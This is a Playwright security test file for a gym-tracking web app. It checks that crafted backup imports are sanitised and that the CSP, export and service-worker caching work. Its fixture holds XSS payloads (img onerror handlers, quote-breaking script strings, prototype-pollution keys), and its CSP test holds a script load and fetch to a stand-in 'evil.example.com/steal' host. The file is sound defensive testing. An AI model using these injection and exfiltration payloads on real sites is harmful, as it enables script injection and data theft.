// Security update: crafted imports, window.name, CSP, self-contained export, built-in styles,
// and the service worker keeping page + stylesheet in step across deploys.
// Run: node tests/security.test.js  (or npm test)
const { chromium, devices, siteDir: defaultSiteDir, outDir: testOutputDir } = require('./harness');
const http = require('http');
const fs = require('fs');
const path = require('path');
const headersFor = require('./harness').responseHeaders;

const siteDir = process.argv[2] || defaultSiteDir;
const outPrefix = process.argv[3] || path.join(testOutputDir, 'security');
const outDir = path.dirname(outPrefix);

let delayHtmlMs = 0;
const serve = (dir) => http.createServer((req, res) => {
    let p = decodeURIComponent(req.url.split('?')[0]);
    if (p.endsWith('/')) p += 'index.html';
    const f = path.join(dir, p);
    if (!fs.existsSync(f)) { res.writeHead(404); return res.end('nf'); }
    const send = () => { res.writeHead(200, headersFor(f, dir)); fs.createReadStream(f).pipe(res); };
    if (f.endsWith('.html') && delayHtmlMs) setTimeout(send, delayHtmlMs); else send();
}).listen(0);

const checks = [];
const check = (name, actual, expected) => {
    const ok = typeof expected === 'function' ? expected(actual) : JSON.stringify(actual) === JSON.stringify(expected);
    checks.push({ ok, name, actual: ok ? undefined : actual, expected: ok || typeof expected === 'function' ? undefined : expected });
};

function craftedBackup(wk1) {
    return {
        dnaVersion: 2, unit: 'kg', isCustomized: true, updatedAt: Date.now() + 5000,
        sessions: [
            { id: "x');window.__pwned='session-id';('", number: 9, name: 'Evil', type: 'weights', exercises: [] },
            {
                id: 'session-1', number: '<b>1</b>', name: 'Legit <img src=x onerror="window.__pwned=\'name\'">', shortName: 'Legit',
                type: 'weights', requiresAssaultBike: true, reminderDay: "'); alert(1); ('", accent: 'emerald',
                exercises: [
                    { id: 'ex-1', name: 'Bench', tag: 'Chest', target: '8-10 reps', defaultSets: 1e9, track: ['__proto__', 'constructor'], rest: '"><img src=x>', bar: '"><img src=x>' },
                    { id: 'ex-2"><img src=x onerror=window.__pwned=7>', name: 'Bad id' },
                    { id: 'ex-3', name: 'Row', tag: 'Cardio', target: '10 mins', track: ['km', 'mins'], rest: 60, notes: 'Seat 4' }
                ]
            }
        ],
        logs: {
            [wk1]: {
                'session-1': {
                    completed: true, date: '"><img src=x onerror=window.__pwned=3>', hiitCals: '<img src=x onerror=window.__pwned=4>', startedAt: 'soon',
                    exercises: {
                        'ex-1': [{ weight: '60', reps: '10', done: true }],
                        'ex-3': [{ weight: '<img src=x onerror=window.__pwned=5>', reps: '20', done: true }],
                        "ex-1');window.__pwned=6;('": [{ weight: '1', reps: '1', done: true }]
                    }
                },
                "x');window.__pwned='log-session';('": { completed: true, exercises: {} }
            },
            '"><img src=x onerror=window.__pwned=8>': { 'session-1': { completed: true, exercises: {} } }
        }
    };
}

(async () => {
    const server = serve(siteDir);
    const port = server.address().port;
    const browser = await chromium.launch();

    // ---------- App under the live headers ----------
    {
        const ctx = await browser.newContext({ ...devices['iPhone 15 Pro'], viewport: { width: 402, height: 874 }, serviceWorkers: 'block', locale: 'en-GB', acceptDownloads: true });
        const page = await ctx.newPage();
        const errors = [], dialogs = [], cspMessages = [], externalHosts = new Set();
        page.on('pageerror', e => errors.push(e.message));
        page.on('dialog', d => { dialogs.push(d.message()); d.dismiss(); });
        page.on('console', m => { if (/Content Security Policy/i.test(m.text())) cspMessages.push(m.text()); });
        page.on('request', r => { const h = new URL(r.url()).hostname; if (h !== 'localhost') externalHosts.add(h); });
        await page.route(/fonts\./, r => r.abort());
        await page.goto(`http://localhost:${port}/`);

        // Styles come from the built stylesheet, not a CDN script
        check('S1 no Tailwind CDN script', await page.locator('script[src*="tailwindcss"]').count(), 0);
        check('S2 styles.css applied (modal hidden)', await page.evaluate(() => getComputedStyle(document.getElementById('backup-modal')).display), 'none');
        check('S3 styles.css applied (rounded-2xl)', await page.evaluate(() => getComputedStyle(document.querySelector('.rounded-2xl')).borderTopLeftRadius), '16px');
        check('S4 custom colours built (bg-gym-600)', await page.evaluate(() => getComputedStyle(document.querySelector('.bg-gym-600')).backgroundColor), 'rgb(5, 150, 105)');
        const imgBaseline = await page.evaluate(() => document.querySelectorAll('img').length);

        // --- Crafted backup code ---
        const wk1 = await page.evaluate(() => getWeekKey(-1));
        const evil = craftedBackup(wk1);
        const code = Buffer.from(unescape(encodeURIComponent(JSON.stringify(evil))), 'binary').toString('base64');
        await page.evaluate(() => openBackupModal());
        await page.fill('#backup-import-input', code);
        await page.click('button[onclick="restoreFromBackupCode()"]');
        await page.waitForTimeout(300);
        const st = await page.evaluate(() => JSON.parse(JSON.stringify({ sessions: state.sessions, logs: state.logs })));
        check('I1 crafted session id dropped', st.sessions.map(s => s.id), ['session-1']);
        check('I2 number coerced', typeof st.sessions[0].number, 'number');
        check('I3 bad exercise id dropped', st.sessions[0].exercises.map(e => e.id), ['ex-1', 'ex-3']);
        check('I4 huge defaultSets clamped', st.sessions[0].exercises[0].defaultSets, 20);
        check('I5 bad track/rest/bar removed', ['track', 'rest', 'bar'].filter(k => k in st.sessions[0].exercises[0]), []);
        check('I6 good exercise fields kept', (({ track, rest, notes }) => ({ track, rest, notes }))(st.sessions[0].exercises[1]), { track: ['km', 'mins'], rest: 60, notes: 'Seat 4' });
        check('I7 bad reminderDay removed', 'reminderDay' in st.sessions[0], false);
        check('I8 unknown field kept', st.sessions[0].accent, 'emerald');
        check('I9 bad week key dropped', Object.keys(st.logs), k => k.includes(wk1) && k.every(x => /^\d{4}-\d{2}-\d{2}$/.test(x)));
        check('I10 bad log session id dropped', Object.keys(st.logs[wk1]), ['session-1']);
        const sl = st.logs[wk1]['session-1'];
        check('I11 bad date/startedAt removed', ['date', 'startedAt'].filter(k => k in sl), []);
        check('I12 bad log exercise id dropped', Object.keys(sl.exercises), ['ex-1', 'ex-3']);
        check('I13 legit set kept', sl.exercises['ex-1'][0], { weight: '60', reps: '10', done: true });

        // Render every view that shows the imported data
        await page.click('#session-tabs-grid button >> nth=0');
        await page.evaluate(() => changeWeek(-1));
        await page.click('text=Workout History').catch(() => {});
        await page.waitForTimeout(200);
        await page.locator('#history-list details summary').first().click().catch(() => {});
        await page.evaluate(() => { const s = document.getElementById('chart-exercise-select'); s.value = 'ex-3'; s.dispatchEvent(new Event('change')); });
        await page.evaluate(() => openRemindersModal());
        await page.waitForTimeout(200);
        await page.screenshot({ path: `${outPrefix}-after-import.png` });
        const pwned1 = await page.evaluate(() => window.__pwned);
        check('I14 no injected code ran', pwned1, undefined);
        check('I15 no injected <img> in page', await page.evaluate(() => document.querySelectorAll('img').length), imgBaseline);
        check('I16 crafted text shown as text', await page.evaluate(() => document.getElementById('history-list').innerText.includes('<img src=x onerror=windo')), true);
        await page.evaluate(() => { closeModal('reminders-modal'); closeModal('history-modal'); state.weekOffset = 0; renderDashboard(); });

        // --- Crafted JSON file ---
        await page.evaluate(() => { localStorage.clear(); sessionStorage.clear(); });
        await page.reload();
        const jsonPath = path.join(outDir, 'crafted-backup.json');
        fs.writeFileSync(jsonPath, JSON.stringify(craftedBackup(wk1)));
        await page.evaluate(() => openBackupModal());
        await page.setInputFiles('input[type=file][accept=".json,application/json"]', jsonPath);
        await page.waitForTimeout(400);
        check('J1 file import sanitised', await page.evaluate(() => state.sessions.map(s => s.id).join(',') + '|' + Object.keys(state.logs).every(k => /^\d{4}-\d{2}-\d{2}$/.test(k))), 'session-1|true');
        await page.evaluate(() => { closeModal('backup-modal'); changeWeek(-1); });
        check('J2 no injected code ran', await page.evaluate(() => window.__pwned), undefined);

        // Junk import is rejected without touching data
        await page.evaluate(() => openBackupModal());
        await page.fill('#backup-import-input', Buffer.from('{"sessions":[{"id":"<x>"}]}').toString('base64'));
        await page.click('button[onclick="restoreFromBackupCode()"]');
        check('J3 junk import rejected, data kept', await page.evaluate(() => state.sessions.map(s => s.id).join(',')), 'session-1');
        await page.evaluate(() => closeModal('backup-modal'));

        // --- window.name: never read back, old copy cleared ---
        await page.evaluate(() => {
            const fake = createDefaultGymDNA();
            fake.sessions[0].name = 'From window.name';
            fake.sessions[0].shortName = 'From window.name';
            window.name = 'PULSEGYM_V1:' + JSON.stringify({ ...fake, dnaVersion: 2, isCustomized: true, updatedAt: Date.now() + 1e9 });
        });
        await page.reload();
        check('W1 window.name data ignored', await page.evaluate(() => state.sessions[0].name), n => n !== 'From window.name');
        check('W2 old window.name copy cleared', await page.evaluate(() => window.name), '');
        await page.evaluate(() => toggleSetDone(state.sessions[0].exercises[0].id, 0));
        check('W3 saving no longer writes window.name', await page.evaluate(() => window.name), '');

        // --- Export: one self-contained file ---
        await page.evaluate(() => openBackupModal());
        const [dl] = await Promise.all([page.waitForEvent('download'), page.evaluate(() => downloadEmbeddedHtmlApp())]);
        const exportDir = path.join(outDir, 'sec-export');
        fs.mkdirSync(exportDir, { recursive: true });
        const exportFile = path.join(exportDir, 'index.html');
        await dl.saveAs(exportFile);
        const html = fs.readFileSync(exportFile, 'utf8');
        check('E1 export has no styles.css link', /<link rel="stylesheet" href="styles\.css">/.test(html), false);
        check('E2 export has the styles inline', /\.bg-gym-600\s*\{/.test(html), true);
        const exportServer = serve(exportDir);
        const p2 = await ctx.newPage();
        await p2.route(/fonts\./, r => r.abort());
        await p2.goto(`http://localhost:${exportServer.address().port}/`);
        check('E3 exported file is styled', await p2.evaluate(() => getComputedStyle(document.querySelector('.rounded-2xl')).borderTopLeftRadius), '16px');
        check('E4 exported file keeps data', await p2.evaluate(() => state.sessions.map(s => s.id).join(',')), 'session-1');
        await p2.close();
        exportServer.close();

        // --- CSP: nothing blocked during normal use, outside code blocked ---
        check('C1 no CSP violations in normal use', cspMessages, []);
        check('C2 only Google Fonts contacted', [...externalHosts].sort(), h => h.every(x => /^fonts\.(googleapis|gstatic)\.com$/.test(x)));
        await page.evaluate(() => {
            const s = document.createElement('script');
            s.src = 'https://evil.example.com/x.js';
            document.head.appendChild(s);
            fetch('https://evil.example.com/steal').catch(() => {});
        });
        await page.waitForTimeout(500);
        check('C3 outside script + fetch refused', cspMessages.filter(m => m.includes('evil.example.com')).length, n => n >= 2);
        check('C4 response headers present', await page.evaluate(async () => {
            const r = await fetch('/');
            return ['content-security-policy', 'x-content-type-options', 'x-frame-options', 'referrer-policy', 'permissions-policy'].filter(h => !r.headers.get(h));
        }), []);

        check('X dialogs', dialogs, []);
        check('X errors', errors, []);
        await ctx.close();
    }

    // ---------- Service worker: page + stylesheet always match ----------
    {
        const pairRoot = path.join(outDir, 'swpair');
        const pairSite = path.join(pairRoot, 'site');
        fs.rmSync(pairRoot, { recursive: true, force: true });
        fs.mkdirSync(pairSite, { recursive: true });
        fs.copyFileSync(path.join(siteDir, '..', 'netlify.toml'), path.join(pairRoot, 'netlify.toml'));
        for (const f of fs.readdirSync(siteDir)) fs.copyFileSync(path.join(siteDir, f), path.join(pairSite, f));
        const baseHtml = fs.readFileSync(path.join(siteDir, 'index.html'), 'utf8');
        const baseCss = fs.readFileSync(path.join(siteDir, 'styles.css'), 'utf8');
        const setVersion = v => {
            fs.writeFileSync(path.join(pairSite, 'index.html'), baseHtml.replace('<head>', `<head>\n    <meta name="pair" content="${v}">`));
            fs.writeFileSync(path.join(pairSite, 'styles.css'), baseCss + `:root{--pair:"${v}"}`);
        };
        setVersion(1);
        const pairServer = serve(pairSite);
        const pairPort = pairServer.address().port;
        const ctx = await browser.newContext({ ...devices['iPhone 15 Pro'] });
        const page = await ctx.newPage();
        await page.route(/fonts\./, r => r.abort());
        const pair = () => page.evaluate(() => `${document.querySelector('meta[name=pair]')?.content}/${getComputedStyle(document.documentElement).getPropertyValue('--pair').trim().replace(/"/g, '')}`);

        await page.goto(`http://localhost:${pairPort}/`);
        await page.evaluate(() => navigator.serviceWorker.ready);
        await page.reload();
        await page.waitForTimeout(500);
        check('P1 controlled by service worker', await page.evaluate(() => !!navigator.serviceWorker.controller), true);
        check('P2 precached page + styles', await page.evaluate(async () => (await (await caches.open('pulsegym-v2')).keys()).map(r => new URL(r.url).pathname).sort()), k => k.includes('/') && k.includes('/styles.css'));
        check('P3 no old CDN entries cached', await page.evaluate(async () => (await (await caches.open('pulsegym-v2')).keys()).some(r => r.url.includes('tailwindcss'))), false);
        check('P4 first load pair', await pair(), '1/1');

        setVersion(2);
        await page.reload();
        check('P5 new deploy online: new page + new styles', await pair(), '2/2');
        await page.waitForTimeout(800);
        await ctx.setOffline(true);
        await page.reload();
        check('P6 offline after deploy: matching pair', await pair(), '2/2');
        await ctx.setOffline(false);

        // Slow signal: page comes from cache after 3s, so the stylesheet must too
        setVersion(3);
        delayHtmlMs = 4500;
        await page.reload({ timeout: 20000 });
        check('P7 slow signal: cached page + cached styles', await pair(), '2/2');
        await page.waitForTimeout(3500); // the slow response lands and is cached with its stylesheet
        delayHtmlMs = 0;
        await ctx.setOffline(true);
        await page.reload();
        check('P8 offline later: the new pair, still matching', await pair(), '3/3');
        await ctx.setOffline(false);
        await ctx.close();
        pairServer.close();
    }

    checks.forEach(c => console.log(`${c.ok ? 'PASS' : 'FAIL'}  ${c.name}${c.ok ? '' : `  got=${JSON.stringify(c.actual)}${c.expected !== undefined ? ` want=${JSON.stringify(c.expected)}` : ''}`}`));
    console.log(`\n${checks.filter(c => c.ok).length}/${checks.length} passed`);
    if (checks.some(c => !c.ok)) process.exitCode = 1;
    await browser.close();
    server.close();
})();
